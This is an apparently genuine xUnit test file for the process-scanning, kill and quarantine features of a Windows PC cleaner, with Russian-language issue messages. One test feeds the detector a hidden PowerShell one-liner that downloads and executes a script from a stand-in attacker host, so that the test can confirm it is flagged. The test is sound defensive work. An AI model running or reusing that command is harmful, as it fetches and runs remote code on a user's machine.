using System.Diagnostics;
using System.IO;
using PcCleaner.Core;
using PcCleaner.Modules.Processes;
using Xunit;
using Xunit.Abstractions;
using static PcCleaner.Tests.Processes.ProcessTestData;

namespace PcCleaner.Tests.Processes;

public class ProcessEvaluationTests
{
    public ProcessEvaluationTests() => TestEnvironment.Init();

    private static readonly SignatureInfo MsSigned = new(SignatureStatus.Valid, "Microsoft Windows Publisher");

    [Fact]
    public void GenuineDefenderInProgramData_IsNotAnImitation()
    {
        var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            @"Microsoft\Windows Defender\Platform\4.18.25000.1\MsMpEng.exe");
        Assert.Equal(SuspicionLevel.None, ProcessesService.Evaluate(path, MsSigned, null, null).Level);
    }

    [Fact]
    public void UnsignedSvchostInAppData_IsHighRisk()
    {
        var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "svchost.exe");
        var result = ProcessesService.Evaluate(path, new SignatureInfo(SignatureStatus.Unsigned, null), null, null);
        Assert.Equal(SuspicionLevel.High, result.Level);
    }

    [Fact]
    public void MicrosoftFileCopiedToTemp_IsStillAnalysedWithItsLocation()
    {
        var path = Path.Combine(Path.GetTempPath(), "svchost.exe");
        Assert.True(ProcessesService.Evaluate(path, MsSigned, null, null).IsSuspicious);
    }

    [Fact]
    public void SignedProgramWithUrlInCommandLine_IsClean()
    {
        var result = ProcessesService.Evaluate(@"C:\Program Files\Vendor\crashpad_handler.exe",
            new SignatureInfo(SignatureStatus.Valid, "Vendor Inc."),
            "crashpad_handler.exe --url=https://crash.vendor.example/report --database=x", null);
        Assert.Equal(SuspicionLevel.None, result.Level);
    }

    [Fact]
    public void HiddenPowerShellDownload_StaysSuspiciousEvenWhenSigned()
    {
        var result = ProcessesService.Evaluate(Path.Combine(Environment.SystemDirectory, @"WindowsPowerShell\v1.0\powershell.exe"),
            MsSigned, "powershell.exe -w hidden -c iex (iwr https://evil.example/a.ps1)", null);
        Assert.True(result.IsSuspicious);
    }

    [Fact]
    public void KnownUnwantedProgram_IsDetectedByCompany()
    {
        var result = ProcessesService.Evaluate(@"C:\Program Files\Something\helper.exe", new SignatureInfo(SignatureStatus.Unsigned, null),
            null, new FileMeta("Helper", "Segurazo Ltd", null));
        Assert.True(result.IsSuspicious);
        Assert.Contains(result.Reasons, r => r.Contains("нежелательная"));
    }

    [Fact]
    public void TrustedPath_IsClean()
    {
        var path = Path.Combine(Path.GetTempPath(), "trusted-by-user-" + Guid.NewGuid().ToString("N")[..6] + ".exe");
        var unsigned = new SignatureInfo(SignatureStatus.Unsigned, null);
        Assert.True(ProcessesService.Evaluate(path, unsigned, null, null).IsSuspicious);
        ProcessesService.SetTrusted(path, true);
        try
        {
            Assert.True(AppServices.Settings.IsTrusted(path));
            Assert.Equal(0, ProcessesService.Evaluate(path, unsigned, null, null).Score);
        }
        finally
        {
            ProcessesService.SetTrusted(path, false);
        }
        Assert.False(AppServices.Settings.IsTrusted(path));
        Assert.True(ProcessesService.Evaluate(path, unsigned, null, null).IsSuspicious);
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\svchost.exe", "svchost.exe", true)]
    [InlineData(@"C:\Windows\System32\svchost.exe", "SVCHOST.EXE", true)]
    [InlineData(@"C:\Windows\System32\svchost.exe", "lsass.exe", false)]
    [InlineData("svchost.exe", "svchost.exe", false)]
    [InlineData(null, "svchost.exe", false)]
    public void ServicePathIsUsedOnlyWhenItNamesTheSameFile(string? path, string name, bool expected)
        => Assert.Equal(expected, ProcessesService.IsPlausiblePath(path, name));

    [Fact]
    public void WmiRowMustDescribeTheSameProcess()
    {
        var start = new DateTime(2026, 10, 16, 9, 30, 0, DateTimeKind.Local);
        Assert.True(ProcessesService.SameStart(start.AddMilliseconds(300), start.ToFileTime()));
        Assert.False(ProcessesService.SameStart(start.AddMinutes(5), start.ToFileTime()));
        Assert.True(ProcessesService.SameStart(null, start.ToFileTime()));
    }
}

public class ProcessIssuesTests
{
    public ProcessIssuesTests() => TestEnvironment.Init();

    private static ProcessIssues.Evaluated Item(int pid, string name, string? path, double cpu, long memory,
        SuspicionResult? suspicion = null, string? description = null)
    {
        var info = new ProcessStaticInfo(new ProcessKey(pid, 1000 + pid), name)
        {
            Path = path,
            Meta = description is null ? null : new FileMeta(description, null, null),
        };
        var sample = new ProcessSample(new RawProcess(pid, 0, name, 1000 + pid, 0, memory, memory, 1), info, cpu);
        return new ProcessIssues.Evaluated(sample, suspicion ?? SuspicionResult.Clean);
    }

    private static readonly MemoryStatus HalfFree = new(16UL << 30, 8UL << 30, 50);

    [Fact]
    public void HealthySystem_HasNoIssues()
    {
        var issues = ProcessIssues.Build(new[] { Item(10, "a.exe", @"C:\A\a.exe", 3, 100) }, HalfFree, selfPid: 1);
        Assert.Empty(issues);
    }

    [Fact]
    public void SuspiciousProgram_OneIssuePerExecutable()
    {
        var high = new SuspicionResult(80, new[] { "Имя системного файла" });
        var items = new[]
        {
            Item(10, "svchost.exe", @"C:\Users\x\AppData\Roaming\svchost.exe", 0, 100, high),
            Item(11, "svchost.exe", @"C:\Users\x\AppData\Roaming\svchost.exe", 0, 100, high),
            Item(12, "tool.exe", @"C:\Tools\tool.exe", 0, 100, new SuspicionResult(40, new[] { "Нет цифровой подписи", "x" })),
            Item(13, "ok.exe", @"C:\Tools\ok.exe", 0, 100, new SuspicionResult(20, new[] { "Нет цифровой подписи" })),
        };
        var issues = ProcessIssues.Build(items, HalfFree, selfPid: 1);
        Assert.Equal(2, issues.Count);
        Assert.Equal("Подозрительный процесс: svchost.exe", issues[0].Title);
        Assert.Equal(IssueSeverity.High, issues[0].Severity);
        Assert.Contains("• Имя системного файла", issues[0].Details);
        Assert.Contains("Запущено процессов: 2", issues[0].Details);
        Assert.Equal(IssueSeverity.Medium, issues[1].Severity);
        Assert.All(issues, i => Assert.Equal("Processes", i.TargetPageKey));
        Assert.All(issues, i => Assert.Null(i.FixAsync));
    }

    [Fact]
    public void LowMemory_ListsTopFiveConsumers()
    {
        var items = Enumerable.Range(1, 7)
            .Select(i => Item(100 + i, $"app{i}.exe", $@"C:\Apps\app{i}.exe", 0, i * 100L * 1024 * 1024, description: $"Приложение {i}"))
            .ToList();
        var issues = ProcessIssues.Build(items, new MemoryStatus(16UL << 30, 1UL << 30, 94), selfPid: 1);
        var issue = Assert.Single(issues);
        Assert.Equal("Мало свободной оперативной памяти", issue.Title);
        Assert.Equal(IssueSeverity.Medium, issue.Severity);
        Assert.Contains("Приложение 7 (app7.exe)", issue.Details);
        Assert.Contains("Приложение 3", issue.Details);
        Assert.DoesNotContain("Приложение 2", issue.Details);
        Assert.Contains("94%", issue.Details);
    }

    [Fact]
    public void HighCpuProgram_IsALowIssue_ButNotTheCleanerItself()
    {
        var items = new[]
        {
            Item(10, "miner.exe", @"C:\X\miner.exe", 40, 1),
            Item(11, "miner.exe", @"C:\X\miner.exe", 30, 1),
            Item(12, "self.exe", @"C:\Y\self.exe", 90, 1),
            Item(13, "calm.exe", @"C:\Z\calm.exe", 49, 1),
        };
        var issues = ProcessIssues.Build(items, HalfFree, selfPid: 12);
        var issue = Assert.Single(issues);
        Assert.Equal(IssueSeverity.Low, issue.Severity);
        Assert.Contains("miner.exe", issue.Title);
        Assert.Contains("70%", issue.Details);
        Assert.Contains("можно завершить", issue.Details);
    }

    [Fact]
    public void HighCpuProtectedSystemProcess_IsNotSuggestedForTermination()
    {
        // The page refuses to kill System / svchost, so the dashboard must not tell the user to do it.
        var items = new[]
        {
            Item(4, "System", null, 60, 1),
            Item(900, "svchost.exe", SvchostPath, 55, 1),
        };
        var issues = ProcessIssues.Build(items, HalfFree, selfPid: 1);
        Assert.Equal(2, issues.Count);
        Assert.All(issues, i =>
        {
            Assert.DoesNotContain("можно завершить", i.Details);
            Assert.Contains("завершать его нельзя", i.Details);
        });
    }
}

/// <summary>Kill paths are tested only on processes the test starts itself.</summary>
public class ProcessKillTests
{
    public ProcessKillTests() => TestEnvironment.Init();

    private static Process StartPing(string? exe = null)
    {
        var psi = new ProcessStartInfo(exe ?? Path.Combine(Environment.SystemDirectory, "PING.EXE"), "-n 30 127.0.0.1")
        {
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
        };
        return Process.Start(psi)!;
    }

    private static KillTarget TargetOf(Process p)
        => new(p.Id, p.StartTime.ToFileTime(), Path.GetFileName(p.MainModule?.FileName ?? "PING.EXE"), p.MainModule?.FileName);

    private static void Cleanup(Process p)
    {
        try
        {
            if (!p.HasExited)
                p.Kill();
        }
        catch (Exception)
        {
            // already gone
        }
        p.Dispose();
    }

    [Fact]
    public void Kill_TerminatesOwnChildProcess()
    {
        var ping = StartPing();
        try
        {
            var service = new ProcessesService();
            var report = service.Kill(new[] { TargetOf(ping) });
            Assert.Single(report.Killed);
            Assert.Empty(report.Failed);
            Assert.True(ping.WaitForExit(5000));
        }
        finally
        {
            Cleanup(ping);
        }
    }

    [Fact]
    public void Kill_WithWrongStartTime_DoesNotTouchTheProcess()
    {
        var ping = StartPing();
        try
        {
            var service = new ProcessesService();
            var stale = TargetOf(ping) with { CreateTime = ping.StartTime.AddMinutes(-10).ToFileTime() };
            var report = service.Kill(new[] { stale });
            Assert.Single(report.AlreadyExited);
            Assert.False(ping.HasExited);
        }
        finally
        {
            Cleanup(ping);
        }
    }

    [Fact]
    public void Kill_RefusesTheCleanerItself()
    {
        var service = new ProcessesService();
        using var self = Process.GetCurrentProcess();
        var report = service.Kill(new[] { new KillTarget(self.Id, self.StartTime.ToFileTime(), "self.exe", Environment.ProcessPath) });
        Assert.Single(report.Failed);
        Assert.Empty(report.Killed);
    }

    [Fact]
    public void Kill_ProcessThatAlreadyExited_IsReportedAsDone()
    {
        var ping = StartPing();
        var target = TargetOf(ping);
        ping.Kill();
        ping.WaitForExit(5000);
        ping.Dispose();
        var report = new ProcessesService().Kill(new[] { target });
        Assert.Equal(1, report.Done);
        Assert.Empty(report.Failed);
    }

    [Fact]
    public async Task KillTree_TerminatesParentAndChildren()
    {
        var psi = new ProcessStartInfo(Path.Combine(Environment.SystemDirectory, "cmd.exe"), "/d /c PING.EXE -n 30 127.0.0.1")
        {
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
        };
        using var cmd = Process.Start(psi)!;
        var source = new NativeProcessSource();
        RawProcess? child = null;
        try
        {
            var cmdCreate = cmd.StartTime.ToFileTime();
            for (var i = 0; i < 50 && child is null; i++)
            {
                child = source.Enumerate()
                    .Where(p => p.ParentPid == cmd.Id && p.CreateTime >= cmdCreate &&
                                p.Name.Equals("PING.EXE", StringComparison.OrdinalIgnoreCase))
                    .Select(p => (RawProcess?)p)
                    .FirstOrDefault();
                if (child is null)
                    await Task.Delay(100);
            }
            Assert.NotNull(child);

            var all = source.Enumerate();
            var root = all.Single(p => p.Pid == cmd.Id);
            var tree = ProcessTree.Collect(all, new[] { root }, p => p.Pid, p => p.ParentPid, p => p.CreateTime);
            Assert.Contains(tree, p => p.Pid == child!.Value.Pid);

            var report = new ProcessesService().Kill(tree.Select(p => new KillTarget(p.Pid, p.CreateTime, p.Name, null)).ToList());
            Assert.Empty(report.Failed);
            Assert.True(cmd.WaitForExit(5000));
            await Task.Delay(200);
            Assert.DoesNotContain(source.Enumerate(), p => p.Pid == child!.Value.Pid && p.CreateTime == child.Value.CreateTime);
        }
        finally
        {
            Cleanup(cmd);
            if (child is { } c)
            {
                // Make sure our own ping is gone even if the test failed half-way.
                try
                {
                    using var p = Process.GetProcessById(c.Pid);
                    if (p.StartTime.ToFileTime() == c.CreateTime)
                        p.Kill();
                }
                catch (Exception)
                {
                    // already exited
                }
            }
        }
    }

    [Fact]
    public async Task Quarantine_KillsTheProcessAndMovesTheFile()
    {
        var dir = TestEnvironment.NewTempDir("quarantine");
        var exe = Path.Combine(dir, "unsigned-test-tool.exe");
        File.Copy(Path.Combine(Environment.SystemDirectory, "PING.EXE"), exe);
        var ping = StartPing(exe);
        try
        {
            // Signature provider stubbed: the copy is really catalog-signed by Microsoft and would be refused.
            var service = new ProcessesService(new NativeProcessSource(), new FakeDetails(),
                _ => new SignatureInfo(SignatureStatus.Unsigned, null));
            var target = new KillTarget(ping.Id, ping.StartTime.ToFileTime(), "unsigned-test-tool.exe", exe);
            var outcome = await service.QuarantineAsync(exe, new[] { target }, "тест", CancellationToken.None);

            Assert.True(outcome.Success, outcome.Message);
            Assert.True(ping.WaitForExit(5000));
            Assert.False(File.Exists(exe));
            var item = Quarantine.List().Single(q => string.Equals(q.OriginalPath, exe, StringComparison.OrdinalIgnoreCase));
            Assert.True(File.Exists(item.StoredPath));
            Quarantine.Delete(item);
        }
        finally
        {
            Cleanup(ping);
        }
    }

    [Fact]
    public async Task Quarantine_WithoutRightsToMoveTheFile_DoesNotKillAnything()
    {
        // E.g. an unwanted program in Program Files while the cleaner runs without admin rights: killing it first and then
        // failing to move the file would be a half-done action.
        var dir = TestEnvironment.NewTempDir("quarantine-norights");
        var exe = Path.Combine(dir, "unsigned-locked-tool.exe");
        File.Copy(Path.Combine(Environment.SystemDirectory, "PING.EXE"), exe);
        var ping = StartPing(exe);
        try
        {
            var service = new ProcessesService(new NativeProcessSource(), new FakeDetails(),
                _ => new SignatureInfo(SignatureStatus.Unsigned, null), canMoveFile: _ => false);
            var target = new KillTarget(ping.Id, ping.StartTime.ToFileTime(), "unsigned-locked-tool.exe", exe);
            var outcome = await service.QuarantineAsync(exe, new[] { target }, "тест", CancellationToken.None);

            Assert.False(outcome.Success);
            Assert.Equal(!Admin.IsElevated, outcome.NeedsElevation);
            Assert.Empty(outcome.Report.Killed);
            Assert.False(ping.HasExited);
            Assert.True(File.Exists(exe));
            Assert.Contains("Ничего не изменено", outcome.Message);
        }
        finally
        {
            Cleanup(ping);
        }
    }

    [Fact]
    public void MoveProbe_IsReadOnlyAndDetectsMissingRights()
    {
        var dir = TestEnvironment.NewTempDir("probe");
        var own = Path.Combine(dir, "mine.exe");
        File.WriteAllText(own, "x");
        Assert.True(FileMoveProbe.CanMove(own));
        Assert.True(File.Exists(own));

        // System files belong to TrustedInstaller: nobody may move them (the probe only opens and closes a handle).
        var systemFile = Path.Combine(Environment.SystemDirectory, "PING.EXE");
        Assert.False(FileMoveProbe.CanMove(systemFile));
        Assert.True(File.Exists(systemFile));
    }

    [Fact]
    public async Task Quarantine_RefusesWindowsFiles()
    {
        var service = new ProcessesService(new FakeProcessSource(), new FakeDetails(), _ => new SignatureInfo(SignatureStatus.Unsigned, null));
        var outcome = await service.QuarantineAsync(SvchostPath, Array.Empty<KillTarget>(), "тест", CancellationToken.None);
        Assert.False(outcome.Success);
        Assert.True(File.Exists(SvchostPath));
    }
}

/// <summary>Read-only checks against the real system.</summary>
public class ProcessRealSystemTests
{
    private readonly ITestOutputHelper _output;

    public ProcessRealSystemTests(ITestOutputHelper output)
    {
        TestEnvironment.Init();
        _output = output;
    }

    [Fact]
    public void NativeSource_SeesThisProcessWithItsPath()
    {
        var source = new NativeProcessSource();
        var all = source.Enumerate();
        Assert.True(all.Count > 10);
        using var self = Process.GetCurrentProcess();
        var me = all.Single(p => p.Pid == self.Id);
        Assert.Equal(self.StartTime.ToFileTime(), me.CreateTime);
        Assert.True(me.MemoryBytes > 0);
        Assert.True(me.CpuTime > 0);
        Assert.Equal(Environment.ProcessPath, source.QueryImagePath(self.Id, me.CreateTime), ignoreCase: true);
        Assert.Null(source.QueryImagePath(self.Id, me.CreateTime + 12345)); // wrong start time = not our process
        Assert.Contains(all, p => p.Pid == 4);
    }

    [Fact]
    public async Task AnalyzeAsync_IsReadOnlyAndFast()
    {
        var service = new ProcessesService();
        var sw = Stopwatch.StartNew();
        var issues = await service.AnalyzeAsync(CancellationToken.None);
        sw.Stop();
        foreach (var issue in issues)
            _output.WriteLine($"[{issue.Severity}] {issue.Title}\n{issue.Details}\n");
        _output.WriteLine($"{issues.Count} issues in {sw.Elapsed.TotalSeconds:0.0} s");
        Assert.True(sw.Elapsed < TimeSpan.FromSeconds(30));
        Assert.All(issues, i =>
        {
            Assert.Equal("Processes", i.TargetPageKey);
            Assert.False(string.IsNullOrWhiteSpace(i.Details));
        });
    }

    [Fact]
    public async Task AnalyzeAsync_HonoursCancellation()
    {
        using var cts = new CancellationTokenSource(TimeSpan.FromMilliseconds(200));
        await Assert.ThrowsAnyAsync<OperationCanceledException>(() => new ProcessesService().AnalyzeAsync(cts.Token));
    }
}
